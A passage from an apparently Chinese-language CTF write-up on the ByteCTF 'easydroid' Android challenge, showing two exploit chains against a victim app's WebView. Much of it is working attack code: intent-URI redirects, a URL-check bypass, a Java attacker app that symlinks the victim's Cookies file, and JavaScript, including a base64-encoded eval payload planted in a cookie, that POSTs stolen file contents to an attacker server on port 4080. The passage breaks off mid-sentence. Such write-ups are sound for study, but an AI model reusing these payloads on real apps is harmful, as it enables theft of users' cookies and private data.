class="string">&quot;PwnAndroid&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_third);</span><br><span class="line">        Log.d(TAG,<span class="string">&quot;third&quot;</span>);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> intent.getData();</span><br><span class="line">        Log.d(TAG,<span class="string">&quot;uri:&quot;</span> + uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121152358192.png" alt="image-20260121152358192"></p><p>服务器上部署一下evil.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>我要跳到Third了哦<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;intent:pwneasydroid#Intent;launchFlags=0x3;package=com.bytectf.pwneasydroid;component=com.bytectf.pwneasydroid/.Third;end&#x27;</span>&gt;</span></span><br><span class="line">  点我跳到 Third</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>意思是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intent:pwneasydroid#Intent;</span><br><span class="line">launchFlags=0x3;</span><br><span class="line">package=com.bytectf.pwneasydroid;</span><br><span class="line">component=com.bytectf.pwneasydroid/.Third;</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><code>0x3</code> &#x3D; <code>0x1 | 0x2</code></p><p>Intent.FLAG_ACTIVITY_NEW_TASK</p><blockquote><p>用户按返回键时，会回到启动该 Task 之前的界面，而不是回到当前 Activity。</p></blockquote><p>Intent.FLAG_ACTIVITY_CLEAR_TOP  </p><blockquote><p>如果目标 Activity 已经在当前任务栈中，则清除它上面的所有 Activity，并把它提到栈顶。</p></blockquote><p>这两个是 <strong>Activity 启动时用来控制任务栈行为”的 flag</strong></p><p>效果</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121152443230.png" alt="image-20260121152443230"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121152450873.png" alt="image-20260121152450873"></p><p>还可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;我要跳到Third了哦&lt;/p&gt;</span><br><span class="line">&lt;a href=&#x27;intent:pwneasydroid#Intent;launchFlags=0x3;package=com.bytectf.easydroid;component=com.bytectf.pwneasydroid/.TestActivity;S.url=https://baidu.com;end&#x27;&gt;</span><br><span class="line">  点我跳到 Third</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>我其实这里的package写错了，但是component写对了，还是跳转了</p><p>component优先级最高（几乎一锤定音）</p><p>在 Intent URI 语法中，不同前缀代表 <strong>extra 的数据类型</strong>：</p><table><thead><tr><th>前缀</th><th>类型</th><th>Java 等价</th></tr></thead><tbody><tr><td><code>S.</code></td><td>String</td><td><code>putExtra(String, String)</code></td></tr><tr><td><code>B.</code></td><td>boolean</td><td><code>putExtra(String, boolean)</code></td></tr><tr><td><code>i.</code></td><td>int</td><td><code>putExtra(String, int)</code></td></tr><tr><td><code>l.</code></td><td>long</td><td><code>putExtra(String, long)</code></td></tr><tr><td><code>f.</code></td><td>float</td><td><code>putExtra(String, float)</code></td></tr><tr><td><code>d.</code></td><td>double</td><td><code>putExtra(String, double)</code></td></tr></tbody></table><p><strong>TestActivity 的代码</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">    <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">    setContentView(webView);</span><br><span class="line">    webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">    webView.loadUrl(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121154217952.png" alt="image-20260121154217952"></p><h2 id="构建攻击APP"><a href="#构建攻击APP" class="headerlink" title="构建攻击APP"></a>构建攻击APP</h2><p>上面demo的两个实验，说明MainActivity里的只是只是一次“跳转证明到达某页面”，不一定获得新的可控输入面。而TestActivity不仅跳转了，还把下一跳 WebView 要加载的页面也控制住了。</p><p><strong>MainActivity：只能间接控制它加载什么，而且必须先绕过校验</strong></p><p>TestActivity：是直接、完全控制它加载什么，没有任何校验</p><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p><strong>符号链接延迟跨源攻击</strong></p><blockquote><p>操纵WebView去访问一个攻击APP自己公开出来的网页，<strong>然后这个网页执行的内容其实就是延时去读取自身</strong>。在延时读取自身的时间窗口内，<strong>这个文件悄悄被进行了替换，替换成了软链接，指向受害APP的一个私有文件</strong>，最终读取窃取其内容</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121161025290.png" alt="image-20260121161025290"></p><p><strong>限制：该漏洞在Android7.0及以上修复，而题目环境为Android8.1，因此无法使用该方法进行攻击，但是在搭建的Android6.0环境上成功实施了攻击</strong></p><table><thead><tr><th><strong>方法</strong></th><th><strong>作用&#x2F;风险</strong></th><th><strong>默认策略</strong></th></tr></thead><tbody><tr><td>setAllowFileAccess(true)</td><td>设置是否允许 WebView <strong>使用 File 协议访问文件系统</strong></td><td><strong>在API29及以下默认设置为 true</strong></td></tr><tr><td>setAllowFileAccessFromFileURLs(true)</td><td>方法用于设置是否允许在文件方案URL的上下文中的跨源请求访问其他文件URL的内容。该方法在API级别30中已被弃用，并且不安全。相反，应使用androidx.webkit.WebViewAssetLoader以安全方式加载文件内容</td><td>在 Android <strong>4.1</strong> 后默认禁止  在<strong>API30</strong>中已被弃用</td></tr><tr><td>setAllowUniversalAccessFromFileURLs(true)</td><td>用于设置是否允许在文件方案URL的上下文中的跨源请求访问任何其他来源的内容。如果应用程序需要访问文件系统，最好避免使用file:&#x2F;&#x2F;URL。而是使用通过HTTPS加载文件的替代方法，例如androidx.webkit.WebViewAssetLoader&#96;</td><td>在 Android 4.1 后默认禁止</td></tr><tr><td>setJavaScriptEnabled(true)</td><td>设置是否允许 WebView <strong>使用 JavaScript</strong></td><td>默认不允许</td></tr></tbody></table><blockquote><p>在Android10及以下默认setAllowFileAccess(true)，而该漏洞不需要setAllowFileAccessFromFileURLs和setAllowUniversalAccessFromFileURLs设置为True即可进行攻击，即绕过了同源检测（必须File读取File本身，读取其他文件还是无法绕过同源策略），但是依旧需要setJavaScriptEnabled设置为True</p></blockquote><p>以上来自LLeaves，这里复现下</p><p>攻击脚本</p><blockquote><p>就是创建一个attack.html文件给easydroid读，在它读之前给这个attack.html加一个软链接读cookier</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;PwnAndroid&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        writeHTML();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.easydroid&quot;</span>,<span class="string">&quot;com.bytectf.easydroid.MainActivity&quot;</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;http://toutiao.com@xx.xxx.xxx.xx/evil.html&quot;</span>);</span><br><span class="line">        intent.setData(data);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeHTML</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">HTML</span> <span class="operator">=</span> <span class="string">&quot;&lt;html&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;body&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    &lt;script&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        var d = document;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        function loadDatabase() &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;            var file_url = d.URL;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;            var xmlhttp = new XMLHttpRequest();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;            xmlhttp.onload = function() &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;                var xhr = new XMLHttpRequest();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;                xhr.open(\&quot;POST\&quot;, \&quot;http://xx.xxx.xxx.xxx:4080\&quot;, true);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;                xhr.setRequestHeader(\&quot;Content-Type\&quot;, \&quot;application/x-www-form-urlencoded\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;                xhr.send(\&quot;file_content=\&quot; + encodeURIComponent(xmlhttp.responseText));\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;                alert(\&quot;File content sent to server.\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;            &#125;;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;            xmlhttp.open(\&quot;GET\&quot;, file_url);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;            xmlhttp.send(null);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        setTimeout(loadDatabase, 8000);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    &lt;/script&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;/body&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;/html&gt;&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">HTML_PATH</span> <span class="operator">=</span> <span class="string">&quot;/data/data/com.bytectf.pwneasydroid/files/attack.html&quot;</span>;</span><br><span class="line">            cmdexec(<span class="string">&quot;mkdir /data/data/com.bytectf.pwneasydroid/files&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;attack.html&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> openFileOutput(filename, Context.MODE_PRIVATE);</span><br><span class="line">                outputStream.write(HTML.getBytes());</span><br><span class="line">                outputStream.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            cmdexec(<span class="string">&quot;chmod -R 777 /data/data/com.bytectf.pwneasydroid/files&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());;</span><br><span class="line"></span><br><span class="line">            webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">            webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line">            webView.getSettings().setAllowUniversalAccessFromFileURLs(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            attack();</span><br><span class="line"></span><br><span class="line">            Thread.sleep(<span class="number">6000</span>);</span><br><span class="line"></span><br><span class="line">            cmdexec(<span class="string">&quot;rm &quot;</span> + HTML_PATH);</span><br><span class="line"></span><br><span class="line">            cmdexec(<span class="string">&quot;ln -s &quot;</span> + <span class="string">&quot;/data/data/com.bytectf.easydroid/app_webview/Cookies&quot;</span> + <span class="string">&quot; &quot;</span> + HTML_PATH);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">cmdexec</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Waiting to steal cookies...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> d = <span class="variable language_">document</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">loadDatabase</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> file_url = d.<span class="property">URL</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://YOUR_SERVER_IP:4080&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">setRequestHeader</span>(</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;Content-Type&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span></span><br><span class="line"><span class="language-javascript">            );</span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">send</span>(</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;file_content=&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">                <span class="built_in">encodeURIComponent</span>(xmlhttp.<span class="property">responseText</span>)</span></span><br><span class="line"><span class="language-javascript">            );</span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, file_url);</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(loadDatabase, <span class="number">8000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>获取当前页面 URL（攻击的锚点）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var file_url = d.URL;</span><br></pre></td></tr></table></figure><p>如果 WebView 当前打开的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///data/data/com.bytectf.pwneasydroid/files/attack.html</span><br></pre></td></tr></table></figure><p>那么：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_url === &quot;file:///data/data/com.bytectf.pwneasydroid/files/attack.html&quot;</span><br></pre></td></tr></table></figure><p>第一个 XMLHttpRequest：读取当前文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var xmlhttp = new XMLHttpRequest();</span><br><span class="line">xmlhttp.open(&quot;GET&quot;, file_url);</span><br><span class="line">xmlhttp.send(null);</span><br></pre></td></tr></table></figure><blockquote><p><strong>用 JS 去读当前这个 file:&#x2F;&#x2F; URL 的内容”</strong></p></blockquote><p>在正常情况下，它会读到 <code>attack.html</code> 自己。</p><p>但在攻击中：</p><ul><li>attack.html 被删掉</li><li>同路径被换成 <strong>指向 Cookies 的符号链接</strong></li></ul><p>读完会发送给攻击者，发送 Cookies 内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.send(&quot;file_content=&quot; + encodeURIComponent(xmlhttp.responseText));</span><br></pre></td></tr></table></figure><p>evil.html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> location.<span class="property">href</span>=<span class="string">&quot;intent:easydroidpwn#Intent;launchFlags=0x3;package=com.bytectf.easydroid;component=com.bytectf.easydroid/.TestActivity;S.url=file:///data/data/com.bytectf.easydroidpwn/files/attack.html;end&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121204404148.png" alt="image-20260121204404148"></p><p>总结其实就是给easydroid发一个intent里面是evil.html，然后easydroid里的Mainactivityload evil.html里的webview执行js，给TestActivity发了个intent Url去执行attack.html里的js，这时让它去读attack.html，但是有8秒的延时机制，此间会把attack.html删了，软链接到cookies。</p><p>为什么不能直接读Cookies，在attack.html里，因为之前也讲了不能直接在 <code>evil.html</code> 里让 WebView 读取 Cookies 文件，是因为：<br> WebView 的同源策略仍然生效，<code>file://</code> 页面不能直接读取“其他路径”的 <code>file://</code> 文件。</p><p>攻击链：<strong>Intent → EasyDroid MainActivity WebView → evil.html → intent → TestActivity WebView → attack.html → 延时 → symlink → 读取 Cookies</strong></p><p>setAllowFileAccess(true)</p><blockquote><p><strong>允许 WebView 访问 <code>file://</code> 本地文件。</strong></p></blockquote><p>setAllowUniversalAccessFromFileURLs </p><blockquote><p><strong>允许 <code>file://</code> 页面访问任意网络资源（http&#x2F;https）</strong>，即“file → internet 跨源”</p></blockquote><p>简单的发起请求不算</p><p>setAllowUniversalAccessFromFileURLs 主要是：</p><ul><li>针对 <strong>更严格的跨源场景</strong></li><li>特别是较新 Android &#x2F; Chromium 版本</li></ul><blockquote><p><strong>符号链接 + TOCTOU + file:&#x2F;&#x2F;）在 Android 8 及以上逐渐失效，是因为 WebView &#x2F; Chromium 开始对 <code>file://</code> 资源进行更严格的隔离与校验，核心变化是：文件访问不再只信 URL，而是引入了更严格的文件句柄、真实路径校验和进程隔离，导致 symlink + 时间差攻击窗口被堵死。</strong></p></blockquote><h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p><strong>污染Cookies窃取数据</strong>:在这个方案里，需要先通过访问恶意HTML将恶意js插入Cookies中，然后控制被攻击APP访问Cookies本身，触发恶意代码造成数据泄露</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121213354608.png" alt="image-20260121213354608"></p><p>具体的攻击思路:  </p><blockquote><p>首先攻击者APP跳转到被攻击APP的MainActivity，使其访问evil.html在该恶意html中设置cookies并且延时40s执行intent跳转，设置cookies即设置恶意代码，等待后续被读取渲染时运行恶意代码，即等待cookies写入到被攻击APP目录下的Cookies文件中后跳转到TestActivity ，然后TestActivity 加载url：file:&#x2F;&#x2F;&#x2F;data&#x2F;data&#x2F;com.bytectf.pwneasydroid&#x2F;files&#x2F;symlink.html ，这个url将会读取pwneasydroid数据目录下的一个symlin.html，该html创建于跳转到被攻击MainActivity至跳转到TestActivity这段时间，使其指向&#x2F;data&#x2F;data&#x2F;com.bytectf.easydroid&#x2F;app_webview&#x2F;Cookies ，然后TestActivity 中webview加载时触发到插入到Cookies里的恶意代码，使其读取Cookies本身并且发送到远程，即可成功实现Cookies泄露，flag就在Cookies中</p><p>这里需要格外注意权限问题：不仅需要给&#x2F;data&#x2F;data&#x2F;com.bytectf.pwneasydroid&#x2F;files 及目录下的文件777权限，而且还要给&#x2F;data&#x2F;data&#x2F;com.bytectf.pwneasydroid 这个目录的777权限，否则将会访问失败</p></blockquote><p>来自LLeaves</p><p>核心是两步：</p><ol><li>污染：让受害 App 的 Cookies 数据库里出现“可执行的恶意 JS 字符串</li><li>触发：让受害 App 的 WebView 去加载Cookies这个文件（SQLite），并把它当成网页内容解析；当解析到插入的那段 JS 时执行，把 Cookies文件内容发出来</li></ol><blockquote><p>也就是说：<strong>不是直接读取 Cookies 文件</strong>（同源&#x2F;权限会拦），而是让 WebView 自己读并执行Cookies里你塞进去的 payload。</p></blockquote><p>Step 1：攻击 App 启动 EasyDroid MainActivity，加载 evil.html</p><ul><li>通过 <code>http://toutiao.com@attacker/evil.html</code> 绕过 <code>contains(&quot;toutiao.com&quot;)</code></li><li>EasyDroid 的 MainActivity WebView 加载 evil.html</li><li>evil.html 做两件事：<ol><li>document.cookie &#x3D; …（或其他方式）把恶意字符串写入 Cookie（最终落入 app_webview&#x2F;Cookies SQLite）</li><li>setTimeout(…, 40s) 延迟后再跳 intent（等 Cookie 写盘）</li></ol></li></ul><p><strong>为什么要延迟？</strong>因为 Cookie 写入 SQLite 不是你发一行 JS 就立刻落盘，有缓存&#x2F;异步；延迟是为了保证恶意 payload 已经写进 Cookies 文件。</p><p>evil.html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">&quot;x = &#x27;&lt;img src=\&quot;x\&quot; onerror=\&quot;eval(atob(&#x27;eGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignUE9TVCcsICdodHRwOi8veHh4Lnh4eC54eHgueHh4OjQwODAnLCB0cnVlKTsgeGhyLnNldFJlcXVlc3RIZWFkZXIoJ0NvbnRlbnQtVHlwZScsICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnKTsgeGhyLnNlbmQoJ2h0bWw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQub3V0ZXJIVE1MKSk7&#x27;))\&quot;&gt;&#x27;&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        location.<span class="property">href</span> = <span class="string">&quot;intent:pwneasydroid#Intent;package=com.bytectf.easydroid;component=com.bytectf.easydroid/.TestActivity;S.url=file:///data/data/com.bytectf.pwneasydroid/files/symlink.html;end&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">40000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>只有两步：</strong></p><ol><li><strong>污染 Cookies</strong></li><li><strong>延时 40 秒 → 触发 TestActivity</strong></li></ol><p>Cookie 名：x，写了一个x肯定不会成功的地址img，然后执行onerror里的js代码，里面经过base64编码，避免转义</p><p>解码后是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xhr = new XMLHttpRequest();</span><br><span class="line">xhr.open(&quot;POST&quot;, &quot;http://xxx.xxx.xxx.xxx:4080&quot;, true);</span><br><span class="line">xhr.setRequestHeader(</span><br><span class="line">  &quot;Content-Type&quot;,</span><br><span class="line">  &quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">);</span><br><span class="line">xhr.send(</span><br><span class="line">  &quot;html=&quot; + encodeURIComponent(document.documentElement.outerHTML)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这段 JS 的效果：</p><ul><li>创建 XHR</li><li>向服务器 4080端口 POST</li><li>发送的内容是：当前 WebView 正在解析的整个 HTML 文档</li></ul><p><strong>注意：此时“正在解析的 HTML 